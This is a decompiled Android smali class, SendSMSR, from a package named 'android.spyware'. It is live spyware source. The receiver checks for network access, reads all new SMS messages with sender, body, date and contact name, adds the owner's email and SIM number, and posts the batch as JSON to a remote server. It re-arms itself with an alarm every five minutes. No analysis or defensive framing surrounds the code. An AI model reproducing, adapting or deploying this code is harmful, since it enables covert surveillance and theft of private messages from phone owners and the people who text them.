.class public Landroid/spyware/SendSMSR;
.super Landroid/content/BroadcastReceiver;
.source "SendSMSR.java"


# instance fields
.field private harvester:Landroid/spyware/Harvester;

.field private prefs:Landroid/content/SharedPreferences;


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 34
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private getSMS(Landroid/content/Context;)Ljava/util/ArrayList;
    .registers 26
    .param p1, "context"    # Landroid/content/Context;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            ")",
            "Ljava/util/ArrayList",
            "<",
            "Landroid/spyware/SMS;",
            ">;"
        }
    .end annotation

    .prologue
    .line 79
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v6, 0x17

    if-lt v2, v6, :cond_19

    .line 80
    const-string v2, "android.permission.READ_SMS"

    move-object/from16 v0, p1

    invoke-static {v0, v2}, Landroid/support/v4/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v2

    if-eqz v2, :cond_19

    .line 82
    const-string v2, "::trace"

    const-string v6, "::ERR  SendSMSR.getSMS(): READ_SMS permission not granted."

    invoke-static {v2, v6}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    .line 83
    const/4 v8, 0x0

    .line 150
    :goto_18
    return-object v8

    .line 88
    :cond_19
    move-object/from16 v0, p0

    iget-object v2, v0, Landroid/spyware/SendSMSR;->prefs:Landroid/content/SharedPreferences;

    const-string v6, "SendSMSR"

    const-wide/16 v12, 0x0

    invoke-interface {v2, v6, v12, v13}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v22

    .line 94
    .local v22, "lastScan":J
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v6, 0x13

    if-lt v2, v6, :cond_e4

    .line 95
    sget-object v3, Landroid/provider/Telephony$Sms;->CONTENT_URI:Landroid/net/Uri;

    .line 96
    .local v3, "URI":Landroid/net/Uri;
    const/4 v2, 0x6

    new-array v4, v2, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v6, "address"

    aput-object v6, v4, v2

    const/4 v2, 0x1

    const-string v6, "body"

    aput-object v6, v4, v2

    const/4 v2, 0x2

    const-string v6, "date"

    aput-object v6, v4, v2

    const/4 v2, 0x3

    const-string v6, "_id"

    aput-object v6, v4, v2

    const/4 v2, 0x4

    const-string v6, "thread_id"

    aput-object v6, v4, v2

    const/4 v2, 0x5

    const-string v6, "type"

    aput-object v6, v4, v2

    .line 104
    .local v4, "COLUMNS":[Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "date > "

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    move-wide/from16 v0, v22

    invoke-virtual {v2, v0, v1}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 105
    .local v5, "WHERE_CONDITION":Ljava/lang/String;
    const-string v7, "date DESC"

    .line 120
    .local v7, "SORT_ORDER":Ljava/lang/String;
    :goto_65
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const/4 v6, 0x0

    invoke-virtual/range {v2 .. v7}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v21

    .line 127
    .local v21, "cursor":Landroid/database/Cursor;
    if-eqz v21, :cond_124

    invoke-interface/range {v21 .. v21}, Landroid/database/Cursor;->getCount()I

    move-result v2

    if-lez v2, :cond_124

    .line 128
    new-instance v8, Ljava/util/ArrayList;

    invoke-direct {v8}, Ljava/util/ArrayList;-><init>()V

    .line 129
    .local v8, "SMSArray":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/spyware/SMS;>;"
    invoke-interface/range {v21 .. v21}, Landroid/database/Cursor;->moveToFirst()Z

    .line 132
    :cond_7e
    const/4 v2, 0x3

    move-object/from16 v0, v21

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v10

    .line 133
    .local v10, "idS":J
    const/4 v2, 0x4

    move-object/from16 v0, v21

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v14

    .line 134
    .local v14, "thread":J
    const/4 v2, 0x0

    move-object/from16 v0, v21

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v16

    .line 135
    .local v16, "contactNo":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v2, v0, Landroid/spyware/SendSMSR;->harvester:Landroid/spyware/Harvester;

    move-object/from16 v0, v16

    invoke-virtual {v2, v0}, Landroid/spyware/Harvester;->getContactName(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v17

    .line 136
    .local v17, "contactName":Ljava/lang/String;
    const/4 v2, 0x1

    move-object/from16 v0, v21

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v18

    .line 137
    .local v18, "message":Ljava/lang/String;
    const/4 v2, 0x5

    move-object/from16 v0, v21

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v19

    .line 138
    .local v19, "type":I
    new-instance v20, Ljava/util/Date;

    const/4 v2, 0x2

    move-object/from16 v0, v21

    invoke-interface {v0, v2}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v12

    move-object/from16 v0, v20

    invoke-direct {v0, v12, v13}, Ljava/util/Date;-><init>(J)V

    .line 140
    .local v20, "date":Ljava/util/Date;
    new-instance v9, Landroid/spyware/SMS;

    move-object/from16 v0, p0

    iget-object v2, v0, Landroid/spyware/SendSMSR;->harvester:Landroid/spyware/Harvester;

    invoke-virtual {v2}, Landroid/spyware/Harvester;->getEmail()Ljava/lang/String;

    move-result-object v12

    move-object/from16 v0, p0

    iget-object v2, v0, Landroid/spyware/SendSMSR;->harvester:Landroid/spyware/Harvester;

    invoke-virtual {v2}, Landroid/spyware/Harvester;->getSim()Ljava/util/Map;

    move-result-object v2

    const-string v6, "simNo"

    invoke-interface {v2, v6}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v13

    check-cast v13, Ljava/lang/String;

    invoke-direct/range {v9 .. v20}, Landroid/spyware/SMS;-><init>(JLjava/lang/String;Ljava/lang/String;JLjava/lang/String;Ljava/lang/String;Ljava/lang/String;ILjava/util/Date;)V

    .line 143
    .local v9, "SMS":Landroid/spyware/SMS;
    invoke-virtual {v8, v9}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 144
    invoke-interface/range {v21 .. v21}, Landroid/database/Cursor;->moveToNext()Z

    move-result v2

    if-nez v2, :cond_7e

    .line 146
    invoke-interface/range {v21 .. v21}, Landroid/database/Cursor;->close()V

    goto/16 :goto_18

    .line 107
    .end local v3    # "URI":Landroid/net/Uri;
    .end local v4    # "COLUMNS":[Ljava/lang/String;
    .end local v5    # "WHERE_CONDITION":Ljava/lang/String;
    .end local v7    # "SORT_ORDER":Ljava/lang/String;
    .end local v8    # "SMSArray":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/spyware/SMS;>;"
    .end local v9    # "SMS":Landroid/spyware/SMS;
    .end local v10    # "idS":J
    .end local v14    # "thread":J
    .end local v16    # "contactNo":Ljava/lang/String;
    .end local v17    # "contactName":Ljava/lang/String;
    .end local v18    # "message":Ljava/lang/String;
    .end local v19    # "type":I
    .end local v20    # "date":Ljava/util/Date;
    .end local v21    # "cursor":Landroid/database/Cursor;
    :cond_e4
    const-string v2, "content://sms/"

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    .line 108
    .restart local v3    # "URI":Landroid/net/Uri;
    const/4 v2, 0x6

    new-array v4, v2, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v6, "address"

    aput-object v6, v4, v2

    const/4 v2, 0x1

    const-string v6, "body"

    aput-object v6, v4, v2

    const/4 v2, 0x2

    const-string v6, "date"

    aput-object v6, v4, v2

    const/4 v2, 0x3

    const-string v6, "_id"

    aput-object v6, v4, v2

    const/4 v2, 0x4

    const-string v6, "thread_id"

    aput-object v6, v4, v2

    const/4 v2, 0x5

    const-string v6, "type"

    aput-object v6, v4, v2

    .line 116
    .restart local v4    # "COLUMNS":[Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "date > "

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    move-wide/from16 v0, v22

    invoke-virtual {v2, v0, v1}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 117
    .restart local v5    # "WHERE_CONDITION":Ljava/lang/String;
    const-string v7, "date DESC"

    .restart local v7    # "SORT_ORDER":Ljava/lang/String;
    goto/16 :goto_65

    .line 150
    .restart local v21    # "cursor":Landroid/database/Cursor;
    :cond_124
    const/4 v8, 0x0

    goto/16 :goto_18
.end method

.method private setAlarm(Landroid/content/Context;)V
    .registers 10
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    const/16 v7, 0xc

    const/4 v6, 0x0

    .line 154
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v2

    .line 155
    .local v2, "nextAlarm":Ljava/util/Calendar;
    const/4 v4, 0x5

    invoke-virtual {v2, v7, v4}, Ljava/util/Calendar;->add(II)V

    .line 157
    new-instance v1, Landroid/content/Intent;

    const-class v4, Landroid/spyware/SendSMSR;

    invoke-direct {v1, p1, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 158
    .local v1, "intent":Landroid/content/Intent;
    const/high16 v4, 0x40000000    # 2.0f

    invoke-static {p1, v6, v1, v4}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v3

    .line 160
    .local v3, "pIntent":Landroid/app/PendingIntent;
    const-string v4, "alarm"

    invoke-virtual {p1, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 161
    .local v0, "am":Landroid/app/AlarmManager;
    invoke-virtual {v2}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v4

    invoke-virtual {v0, v6, v4, v5, v3}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 164
    const-string v4, "::trace"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "::INF  SendSMS alarm set for: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const/16 v6, 0xa

    invoke-virtual {v2, v6}, Ljava/util/Calendar;->get(I)I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 165
    invoke-virtual {v2, v7}, Ljava/util/Calendar;->get(I)I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const/16 v6, 0xd

    invoke-virtual {v2, v6}, Ljava/util/Calendar;->get(I)I

    move-result v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 164
    invoke-static {v4, v5}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 167
    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 15
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 40
    invoke-static {p1}, Landroid/preference/PreferenceManager;->getDefaultSharedPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;

    move-result-object v7

    iput-object v7, p0, Landroid/spyware/SendSMSR;->prefs:Landroid/content/SharedPreferences;

    .line 41
    new-instance v7, Landroid/spyware/Harvester;

    invoke-direct {v7, p1}, Landroid/spyware/Harvester;-><init>(Landroid/content/Context;)V

    iput-object v7, p0, Landroid/spyware/SendSMSR;->harvester:Landroid/spyware/Harvester;

    .line 43
    iget-object v7, p0, Landroid/spyware/SendSMSR;->harvester:Landroid/spyware/Harvester;

    invoke-virtual {v7}, Landroid/spyware/Harvester;->isNetworkConnected()Z

    move-result v7

    if-eqz v7, :cond_b2

    .line 44
    const-string v7, "::trace"

    const-string v8, "::INF  Scanning SMS..."

    invoke-static {v7, v8}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 45
    invoke-direct {p0, p1}, Landroid/spyware/SendSMSR;->getSMS(Landroid/content/Context;)Ljava/util/ArrayList;

    move-result-object v1

    .line 47
    .local v1, "SMSArray":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/spyware/SMS;>;"
    if-eqz v1, :cond_90

    invoke-virtual {v1}, Ljava/util/ArrayList;->isEmpty()Z

    move-result v7

    if-nez v7, :cond_90

    .line 48
    new-instance v5, Lorg/json/JSONArray;

    invoke-direct {v5}, Lorg/json/JSONArray;-><init>()V

    .line 50
    .local v5, "jSMSArray":Lorg/json/JSONArray;
    const/4 v3, 0x0

    .local v3, "i":I
    :goto_2e
    invoke-virtual {v1}, Ljava/util/ArrayList;->size()I

    move-result v7

    if-ge v3, v7, :cond_44

    .line 51
    invoke-virtual {v1, v3}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/spyware/SMS;

    invoke-virtual {v7}, Landroid/spyware/SMS;->toJSON()Lorg/json/JSONObject;

    move-result-object v4

    .line 52
    .local v4, "jSMS":Lorg/json/JSONObject;
    invoke-virtual {v5, v4}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 50
    add-int/lit8 v3, v3, 0x1

    goto :goto_2e

    .line 55
    .end local v4    # "jSMS":Lorg/json/JSONObject;
    :cond_44
    new-instance v6, Landroid/spyware/Param;

    const-string v7, "SMS"

    invoke-direct {v6, v7, v5}, Landroid/spyware/Param;-><init>(Ljava/lang/String;Lorg/json/JSONArray;)V

    .line 56
    .local v6, "mParams":Landroid/spyware/Param;
    new-instance v0, Landroid/spyware/PostDataAT;

    invoke-direct {v0}, Landroid/spyware/PostDataAT;-><init>()V

    .line 59
    .local v0, "PostJSONArray":Landroid/os/AsyncTask;, "Landroid/os/AsyncTask<Landroid/spyware/Param;Ljava/lang/Void;Ljava/lang/Integer;>;"
    const/4 v7, 0x1

    :try_start_51
    new-array v7, v7, [Landroid/spyware/Param;

    const/4 v8, 0x0

    aput-object v6, v7, v8

    invoke-virtual {v0, v7}, Landroid/os/AsyncTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 61
    invoke-virtual {v0}, Landroid/os/AsyncTask;->get()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Ljava/lang/Integer;

    const/16 v8, 0xc8

    invoke-static {v8}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/Integer;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_90

    .line 63
    iget-object v7, p0, Landroid/spyware/SendSMSR;->prefs:Landroid/content/SharedPreferences;

    invoke-interface {v7}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v8

    const-string v9, "SendSMSR"

    const/4 v7, 0x0

    invoke-virtual {v1, v7}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/spyware/SMS;

    invoke-virtual {v7}, Landroid/spyware/SMS;->getDate()Ljava/util/Date;

    move-result-object v7

    invoke-virtual {v7}, Ljava/util/Date;->getTime()J

    move-result-wide v10

    invoke-interface {v8, v9, v10, v11}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object v7

    invoke-interface {v7}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 65
    const-string v7, "::trace"

    const-string v8, "::INF  SendSMSR.onReceive(): SharedPreferences updated."

    invoke-static {v7, v8}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_90
    .catch Ljava/lang/Exception; {:try_start_51 .. :try_end_90} :catch_94

    .line 74
    .end local v0    # "PostJSONArray":Landroid/os/AsyncTask;, "Landroid/os/AsyncTask<Landroid/spyware/Param;Ljava/lang/Void;Ljava/lang/Integer;>;"
    .end local v1    # "SMSArray":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/spyware/SMS;>;"
    .end local v3    # "i":I
    .end local v5    # "jSMSArray":Lorg/json/JSONArray;
    .end local v6    # "mParams":Landroid/spyware/Param;
    :cond_90
    :goto_90
    invoke-direct {p0, p1}, Landroid/spyware/SendSMSR;->setAlarm(Landroid/content/Context;)V

    .line 75
    return-void

    .line 67
    .restart local v0    # "PostJSONArray":Landroid/os/AsyncTask;, "Landroid/os/AsyncTask<Landroid/spyware/Param;Ljava/lang/Void;Ljava/lang/Integer;>;"
    .restart local v1    # "SMSArray":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/spyware/SMS;>;"
    .restart local v3    # "i":I
    .restart local v5    # "jSMSArray":Lorg/json/JSONArray;
    .restart local v6    # "mParams":Landroid/spyware/Param;
    :catch_94
    move-exception v2

    .line 68
    .local v2, "e":Ljava/lang/Exception;
    const-string v7, "::trace"

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "::ERR   "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-static {v2}, Landroid/util/Log;->getStackTraceString(Ljava/lang/Throwable;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-static {v7, v8}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_90

    .line 72
    .end local v0    # "PostJSONArray":Landroid/os/AsyncTask;, "Landroid/os/AsyncTask<Landroid/spyware/Param;Ljava/lang/Void;Ljava/lang/Integer;>;"
    .end local v1    # "SMSArray":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Landroid/spyware/SMS;>;"
    .end local v2    # "e":Ljava/lang/Exception;
    .end local v3    # "i":I
    .end local v5    # "jSMSArray":Lorg/json/JSONArray;
    .end local v6    # "mParams":Landroid/spyware/Param;
    :cond_b2
    const-string v7, "::trace"

    const-string v8, "::ERR  SendSMSR.onReceive(): No internet connectivity."

    invoke-static {v7, v8}, Landroid/util/Log;->wtf(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_90
.end method
